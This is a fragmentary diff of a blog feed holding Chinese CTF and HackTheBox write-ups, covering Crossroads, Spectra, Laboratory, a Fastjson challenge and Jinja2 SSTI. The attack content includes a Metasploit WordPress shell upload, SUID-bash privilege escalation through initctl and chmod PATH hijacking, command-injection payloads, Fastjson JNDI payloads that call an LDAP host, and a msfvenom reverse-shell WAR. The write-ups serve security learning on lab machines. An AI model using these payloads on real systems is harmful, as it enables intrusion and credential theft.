 &lt;/div&gt;&lt;p&gt;扫描结果&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;PORT    STATE SERVICE     VERSION
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PORT    STATE SERVICE     VERSION
 80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
 | http-robots.txt: 1 disallowed entry
 |_/crossroads.png
@@ -8524,7 +8922,7 @@ Service Info: Host: CROSSROADS
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;结果&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Disk                                                    Permissions     Comment
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Disk                                                    Permissions     Comment
 ----                                                    -----------     -------
 print$                                                  NO ACCESS       Printer Drivers
 smbshare                                                NO ACCESS
@@ -8539,7 +8937,7 @@ IPC$                                                    NO ACCESS       IPC Serv
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;找到本地用户&lt;strong&gt;albert&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;S-1-5-21-198007098-3908253677-2746664996-1001 CROSSROADS\albert (Local User)
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;S-1-5-21-198007098-3908253677-2746664996-1001 CROSSROADS\albert (Local User)
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;有用户还需要密码，咋整，爆他，参考文章&lt;a href=&#34;https://www.cnblogs.com/-wenli/p/10107643.html&#34;&gt;https://www.cnblogs.com/-wenli/p/10107643.html&lt;/a&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -8564,7 +8962,7 @@ smbclient //192.168.150.134/albert -U albert &lt;span class=&#34;c1&#34;&gt;# cr
 &lt;h3 id=&#34;beroot&#34;&gt;beroot&lt;/h3&gt;
 &lt;p&gt;除了user.txt，我们还可以看到用户目录下还有beroot可执行文件，执行了它可能成为root，那要怎么执行呢？&lt;/p&gt;
 &lt;p&gt;从smb.conf中我们可以知道&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[smbshare]
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[smbshare]
 
 path = /home/albert/smbshare
 valid users = albert
@@ -8657,7 +9055,7 @@ put smbscript.sh
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;扫描结果&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;PORT     STATE SERVICE VERSION
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
 | ssh-hostkey: 
 |_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
@@ -8718,7 +9116,7 @@ put smbscript.sh
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;mysql只能本地连，那就后台登录，显示用户名未知，换成&lt;strong&gt;administrator&lt;/strong&gt;就可以成功登录。&lt;/p&gt;
 &lt;p&gt;成功登陆后我们就可以使用msf反弹shell&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;use exploit/unix/webapp/wp_admin_shell_upload
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;use exploit/unix/webapp/wp_admin_shell_upload
 set RHOST 10.10.10.229
 set LHOST 10.10.16.3
 set TARGETURI /main/
@@ -8726,11 +9124,11 @@ set USERNAME administrator
 set PASSWORD devteam01
 run
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功生成meterpreter，然后生成shell&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter&amp;gt; shell
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter&amp;gt; shell
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这时候是无终端状态，可以通过&lt;code&gt;python3 -c &amp;quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&amp;quot;&lt;/code&gt;生成终端，但是做题的时候直接使用会出错，仔细看报错：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;cwd = os.getcwd()
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cwd = os.getcwd()
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;路径未知导致报错，所以我们要给一个路径，先切到&lt;code&gt;/tmp&lt;/code&gt;目录下再生成终端就能成功&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;cd /tmp
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd /tmp
 python3 -c &amp;quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&amp;quot;
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;usertxt&#34;&gt;user.txt&lt;/h3&gt;
 &lt;p&gt;在&lt;strong&gt;katie&lt;/strong&gt;用户目录下可以看到user.txt，但是由于权限问题无法读取，所以接下来的任务就是登录该用户获得flag。&lt;/p&gt;
@@ -8788,11 +9186,11 @@ script
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;虽然看不懂这脚本在干啥，但是可以看到它使用了什么目录，从目录中可以获得passwd：&lt;strong&gt;SummerHereWeCome!!&lt;/strong&gt;，然后依次尝试ssh连接几个用户，成功登录katie获得user.txt(直接切换用户没成功，也不知道啥原因)&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;ssh katie@10.10.10.229
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ssh katie@10.10.10.229
 SummerHereWeCome!!
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;roottxt&#34;&gt;root.txt&lt;/h3&gt;
 &lt;p&gt;通过&lt;code&gt;sudo -l&lt;/code&gt;查看当前用户(katie)可以直接执行的二进制文件&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;User katie may run the following commands on spectra:
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;User katie may run the following commands on spectra:
 	(ALL) SETENV: NOPASSWD: /sbin/initctl
 &lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.linuxcool.com/initctl&#34;&gt;文件&lt;/a&gt;描述：
@@ -8810,7 +9208,7 @@ initctl命令的作用是控制和管理init守护进程&lt;/p&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;都是stop状态，那么我们可以随便修改一个文件再启动就可以获得sudo权限。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;description &amp;quot;Test node.js server&amp;quot;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;description &amp;quot;Test node.js server&amp;quot;
 author      &amp;quot;katie&amp;quot;
 
 start on filesystem or runlevel [2345]
@@ -8820,7 +9218,7 @@ script
    chmod +s /bin/bash
 end script
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;启动文件&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sudo /sbin/initctl start test3
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo /sbin/initctl start test3
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最后通过命令&lt;code&gt;/bin/bash -p&lt;/code&gt;成功提权。&lt;/p&gt;
 &lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
 &lt;p&gt;1、不能独立做题，过度依赖wp&lt;/p&gt;
@@ -9364,10 +9762,10 @@ end script
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;err&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;二次编码&lt;/span&gt;
-&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://127.1:3000/debug?url=http://%2527;cp$IFS/flag$IFS/tmp/log%00&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;span class=&#34;err&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;特殊编码&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;%EF%BC%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;87&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;解码为&amp;#39;&lt;/span&gt;
-&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://127.1:3000/debug?url=http://%EF%BC%87;cp$IFS/flag$IFS/tmp/log%00&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 二次编码
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://127.1:3000/debug?url=http://%2527;cp$IFS/flag$IFS/tmp/log%00&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;// 特殊编码 =&amp;gt; %EF%BC%87解码为&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://127.1:3000/debug?url=http://%EF%BC%87;cp$IFS/flag$IFS/tmp/log%00&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;</content>
@@ -9779,7 +10177,7 @@ end script
             
                 <content type="html">&lt;h2 id=&#34;misc-你会日志分析吗&#34;&gt;misc-你会日志分析吗&lt;/h2&gt;
 &lt;p&gt;SQL时间注入日志，根据sleep(2)查看时间间隔确定字符&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;90,109,120,104,90,51,116,90,98,51,86,102,89,88,74,108,88,51,78,118,88,50,100,121,90,87,70,48,102,81,61,61
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;90,109,120,104,90,51,116,90,98,51,86,102,89,88,74,108,88,51,78,118,88,50,100,121,90,87,70,48,102,81,61,61
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;转换字符&lt;code&gt;ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==&lt;/code&gt;，然后base64解码得flag&lt;/p&gt;
 &lt;h2 id=&#34;web-签到&#34;&gt;web-签到&lt;/h2&gt;
 &lt;blockquote&gt;
@@ -10182,7 +10580,7 @@ end script
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;扫描结果&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;PORT    STATE SERVICE  VERSION
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
@@ -10215,7 +10613,7 @@ Aggressive OS guesses: Linux 4.15 - 5.6 (91%), Linux 5.0 (91%), Linux 5.0 - 5.4 
 &lt;p&gt;判断使用公私钥认证登录，这样就无法对22端口进行爆破。&lt;/p&gt;
 &lt;h2 id=&#34;渗透过程&#34;&gt;渗透过程&lt;/h2&gt;
 &lt;p&gt;在/etc/hosts添加DNS解析：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;10.10.10.216 laboratory.htb
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;10.10.10.216 laboratory.htb
 10.10.10.216 git.laboratory.htb
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;访问&lt;strong&gt;laboratory.htb&lt;/strong&gt;发现当前页面并没有隐藏其他文件的信息，扫目录也没有结果，只有人名&lt;strong&gt;Dexter&lt;/strong&gt;和&lt;strong&gt;Dee Dee&lt;/strong&gt;，由于&lt;strong&gt;Dexter&lt;/strong&gt;的特殊身份CEO，他在站点中应该有着特殊的权限。&lt;/p&gt;
 &lt;p&gt;然后从&lt;strong&gt;git.laboratory.htb&lt;/strong&gt;下手，注册邮箱不知道为什么必须使用&lt;code&gt;@laboratory.htb&lt;/code&gt;域名的，先注册再说。&lt;/p&gt;
@@ -10312,7 +10710,7 @@ cat user.txt &lt;span class=&#34;c1&#34;&gt;# 获得user flag&lt;/span&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;&lt;code&gt;ls -l&lt;/code&gt;发现该文件所有者是root，但是dexter拥有执行权限，再加上suid属性，dexter执行该文件时拥有root权限。&lt;/p&gt;
 &lt;p&gt;读取该文件获得部分重要命令：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;chmod 700 /usr/bin/docker
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;chmod 700 /usr/bin/docker
 chmod 660 /var/run/docker.sock
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现执行了chmod命令，但是并没有限制chmod是&lt;code&gt;/usr/bin/chmod&lt;/code&gt;，因此我们可以劫持chmod伪造环境变量。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -10602,9 +11000,9 @@ chmod +x chmod
 &lt;blockquote&gt;
 &lt;p&gt;1、测试外连&lt;/p&gt;
 &lt;p&gt;vps开启监听，&lt;code&gt;/create&lt;/code&gt;路由发送payload&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;roleJson={&amp;quot;name&amp;quot;:{&amp;quot;@type&amp;quot;:&amp;quot;java.lang.Class&amp;quot;,&amp;quot;val&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;},&amp;quot;x&amp;quot;:{&amp;quot;@type&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;,&amp;quot;dataSourceName&amp;quot;:&amp;quot;ldap://IP:7777/Exploit&amp;quot;,&amp;quot;autoCommit&amp;quot;:true}}}
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;roleJson={&amp;quot;name&amp;quot;:{&amp;quot;@type&amp;quot;:&amp;quot;java.lang.Class&amp;quot;,&amp;quot;val&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;},&amp;quot;x&amp;quot;:{&amp;quot;@type&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;,&amp;quot;dataSourceName&amp;quot;:&amp;quot;ldap://IP:7777/Exploit&amp;quot;,&amp;quot;autoCommit&amp;quot;:true}}}
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时返回Hacker，使用Unicode绕过&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;roleJson={&amp;quot;name&amp;quot;:{&amp;quot;\u0040\u0074\u0079\u0070\u0065&amp;quot;:&amp;quot;java.lang.Class&amp;quot;,&amp;quot;val&amp;quot;:&amp;quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&amp;quot;},&amp;quot;x&amp;quot;:{&amp;quot;\u0040\u0074\u0079\u0070\u0065&amp;quot;:&amp;quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&amp;quot;,&amp;quot;dataSourceName&amp;quot;:&amp;quot;ldap://IP:PORT/Exploit&amp;quot;,&amp;quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&amp;quot;:true}}}
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;roleJson={&amp;quot;name&amp;quot;:{&amp;quot;\u0040\u0074\u0079\u0070\u0065&amp;quot;:&amp;quot;java.lang.Class&amp;quot;,&amp;quot;val&amp;quot;:&amp;quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&amp;quot;},&amp;quot;x&amp;quot;:{&amp;quot;\u0040\u0074\u0079\u0070\u0065&amp;quot;:&amp;quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&amp;quot;,&amp;quot;dataSourceName&amp;quot;:&amp;quot;ldap://IP:PORT/Exploit&amp;quot;,&amp;quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&amp;quot;:true}}}
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果监听服务器有流量，可以继续下一步&lt;/p&gt;
 &lt;p&gt;2、准备LDAP服务和Web服务&lt;/p&gt;
 &lt;p&gt;将marshalsec-0.0.3-SNAPSHOT-all.jar文件和Exploit.java放在同一目录下，在&lt;strong&gt;当前目录下运行LDAP服务&lt;/strong&gt;,修改IP为当前这台服务器的IP&lt;/p&gt;
@@ -10637,7 +11035,7 @@ chmod +x chmod
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;4、执行&lt;/p&gt;
 &lt;p&gt;修改ip为正在运行LDAP和Web服务的服务器IP（LDAP端口默认被设置为1389）&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;roleJson={&amp;quot;name&amp;quot;:{&amp;quot;\u0040\u0074\u0079\u0070\u0065&amp;quot;:&amp;quot;java.lang.Class&amp;quot;,&amp;quot;val&amp;quot;:&amp;quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&amp;quot;},&amp;quot;x&amp;quot;:{&amp;quot;\u0040\u0074\u0079\u0070\u0065&amp;quot;:&amp;quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&amp;quot;,&amp;quot;dataSourceName&amp;quot;:&amp;quot;ldap://IP:1389/Exploit&amp;quot;,&amp;quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&amp;quot;:true}}}
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;roleJson={&amp;quot;name&amp;quot;:{&amp;quot;\u0040\u0074\u0079\u0070\u0065&amp;quot;:&amp;quot;java.lang.Class&amp;quot;,&amp;quot;val&amp;quot;:&amp;quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&amp;quot;},&amp;quot;x&amp;quot;:{&amp;quot;\u0040\u0074\u0079\u0070\u0065&amp;quot;:&amp;quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&amp;quot;,&amp;quot;dataSourceName&amp;quot;:&amp;quot;ldap://IP:1389/Exploit&amp;quot;,&amp;quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&amp;quot;:true}}}
 &lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
 &lt;h2 id=&#34;easy_laravelunsolve&#34;&gt;Easy_laravel|unsolve&lt;/h2&gt;
 &lt;blockquote&gt;
@@ -10824,7 +11222,7 @@ run
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;利用成功。读取根目录user.txt&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Try your best, you have passed the first challenge, and the last one is for you, root me!
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Try your best, you have passed the first challenge, and the last one is for you, root me!
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;提权&#34;&gt;提权&lt;/h3&gt;
 &lt;p&gt;读取tomcat用户配置文件(&lt;code&gt;/usr/local/tomcat/conf/tomcat-users.xml&lt;/code&gt;)获得管理员账号&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -10850,7 +11248,7 @@ run
 &lt;p&gt;而firefox目录下&lt;code&gt;fvbljmev.default-release&lt;/code&gt;目录存在key4.db，我们可以通过该文件获得密钥。&lt;/p&gt;
 &lt;p&gt;按照文章的解密方法，不管什么方法似乎都不能在meterpreter上使用，所以我们还是要获得一个完整的shell。&lt;/p&gt;
 &lt;p&gt;运行命令生成war包&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.150.128 LPOST=4444 -f war &amp;gt; reverse.war
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.150.128 LPOST=4444 -f war &amp;gt; reverse.war
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将shell打包后上传，tomcat管理员可以获得路径信息&lt;code&gt;/reverse&lt;/code&gt;，然后访问反弹shell。&lt;/p&gt;
 &lt;p&gt;使用&lt;code&gt;python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt;生成交互式终端。&lt;/p&gt;
 &lt;p&gt;使用&lt;a href=&#34;https://github.com/unode/firefox_decrypt&#34;&gt;firefox_decrypt&lt;/a&gt;解密key4.db获得密码：&lt;/p&gt;
@@ -11120,7 +11518,7 @@ wget -r 192.168.150.129:8090/ &lt;span class=&#34;c1&#34;&gt;# 下载靶机firef
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;分析一下payload：&lt;/p&gt;
 &lt;p&gt;在&lt;a href=&#34;http://docs.jinkan.org/docs/jinja2/templates.html#id2&#34;&gt;官方文档&lt;/a&gt;中描述了两种分隔符的区别：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;   这里有两种分隔符: {%%} 和 {{}}。
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;   这里有两种分隔符: {%%} 和 {{}}。
    前者用于执行诸如 for 循环 或赋值的语句，后者把表达式的结果打印到模板上。
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;      在本地尝试的时候发现没有print就会报出&lt;strong&gt;jinja2.exceptions.TemplateSyntaxError: tag name expected&lt;/strong&gt;的错误，也就是控制结构需要一个可以运行的函数(猜测)，如if、for、print，但是什么函数可以执行我不清楚hh。。。可以肯定的是，print可以执行，并且可以让控制结构拥有输出结果的能力。&lt;/p&gt;
 &lt;p&gt;      lipsum是jinja2的内置全局变量，jinja2一共有3个内置的全局函数：&lt;code&gt;range、lipsum、dict&lt;/code&gt;，其中只有lipsum有&lt;code&gt;__globals__&lt;/code&gt;键，其他两个要逃肯定逃得出来，但是payload构造就要花点功夫了，比如&lt;a href=&#34;https://www.anquanke.com/post/id/223895#h2-0&#34;&gt;0RAYS-安洵杯writeup&lt;/a&gt;使用普通变量构造的payload。除此之外，flask也提供了两个内置的全局函数：&lt;code&gt;url_for、get_flashed_messages&lt;/code&gt;，两个都有&lt;code&gt;__globals__&lt;/code&gt;键，但是这里ban掉了&lt;code&gt;_&lt;/code&gt;，所以要用内置函数只能用lipsum了。&lt;/p&gt;
@@ -11251,7 +11649,7 @@ wget -r 192.168.150.129:8090/ &lt;span class=&#34;c1&#34;&gt;# 下载靶机firef
 &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
 
 &lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;login_html&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;readFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;dirname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;login.html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;login_html&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;readFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__dirname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;login.html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
     &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;login_html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
 
@@ -11958,9 +12356,9 @@ wget -r 192.168.150.129:8090/ &lt;span class=&#34;c1&#34;&gt;# 下载靶机firef
 &lt;/div&gt;
